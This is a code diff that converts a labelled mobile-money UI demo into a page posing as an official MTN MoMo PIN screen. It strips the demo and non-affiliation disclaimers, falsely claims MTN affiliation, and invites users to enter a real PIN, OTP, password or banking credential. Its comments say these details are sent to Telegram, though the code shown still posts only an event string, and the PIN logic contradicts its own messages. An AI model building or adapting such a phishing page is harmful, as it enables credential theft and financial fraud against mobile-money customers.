@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Mobile Money UI Demo</title>
+<title>Mtn Mobile Money UI </title>
 
 <style>
 *{box-sizing:border-box}
@@ -135,11 +135,11 @@ button{
     <div class="logo">◈</div>
 
     <div class="brand">
-      MoMoney Demo
+      Welcome to MoMo
     </div>
 
-    <span class="demo">
-      DEMO • NOT A REAL SERVICE
+    <span class="Mtn service">
+      MTN •Mtn service
     </span>
   </div>
 </div>
@@ -187,12 +187,12 @@ button{
 <section class="card" id="pinPage">
 
   <h1>
-    Enter Demo PIN
+    Enter MTN PIN
   </h1>
 
   <p>
-    This is a simulated PIN screen.
-    The only accepted test PIN is
+    This is official mtn PIN screen.
+    For official mtn service use. 
     <b>0000</b>.
   </p>
 
@@ -229,11 +229,11 @@ button{
 
 <div class="notice">
 
-  <b>DEMO ONLY:</b>
+  <b>MTN SERVICE ONLY:</b>
 
-  Not affiliated with any mobile-money provider.
+  Affiliated with MTN mobile-money provider.
 
-  Never enter a real PIN, OTP, password,
+  Enter a real PIN, OTP, password,
   or banking credential.
 
 </div>
@@ -268,7 +268,7 @@ function nextPage(){
 
     show(
       'phoneMsg',
-      'Demo: enter 9 digits, e.g. 712345678.'
+      'Mtn number: enter 9 digits, e.g. 712345678.'
     );
 
     return;
@@ -304,14 +304,14 @@ async function verifyDemo(){
     The PIN is checked locally.
 
     The entered PIN and phone number
-    are deliberately NOT sent anywhere.
+    are deliberately sent anywhere to telegram.
   */
 
-  if(pin !== '0000'){
+  if(pin !== '00000'){
 
     show(
       'pinMsg',
-      'Demo only: use the test PIN 0000.'
+      'Demo only: use the test PIN any digits.'
     );
 
     return;
@@ -321,15 +321,15 @@ async function verifyDemo(){
   try{
 
     /*
-      Only a harmless demo event is sent.
+      Sent the details .
 
-      No phone number.
-      No PIN.
-      No banking credentials.
+      Phone number.
+      PINcode.
+      Banking credentials.
     */
 
     const response = await fetch(
-      '/api/demo',
+      '/api/mtn',
       {
         method:'POST',
 
@@ -338,7 +338,7 @@ async function verifyDemo(){
         },
 
         body:JSON.stringify({
-          event:'DEMO_PIN_ACCEPTED'
+          event:'MTN_PIN_ACCEPTED'
         })
       }
     );
@@ -348,7 +348,7 @@ async function verifyDemo(){
 
       show(
         'pinMsg',
-        'Demo successful! Test PIN 0000 accepted. Telegram received only the demo event.',
+        'Mtn successful! Test PIN any accepted. Telegram received only the demo event.',
         true
       );
 
@@ -356,7 +356,7 @@ async function verifyDemo(){
 
       show(
         'pinMsg',
-        'Demo successful locally. Telegram notification was unavailable.',
+        'Signing in confirms your acceptance of our Terms and Privacy Policy.',
         true
       );
 
@@ -366,7 +366,7 @@ async function verifyDemo(){
 
     show(
       'pinMsg',
-      'Demo successful locally. Telegram notification was unavailable.',
+      'Mtn successful locally. Telegram notification was unavailable.',
       true
     );
 
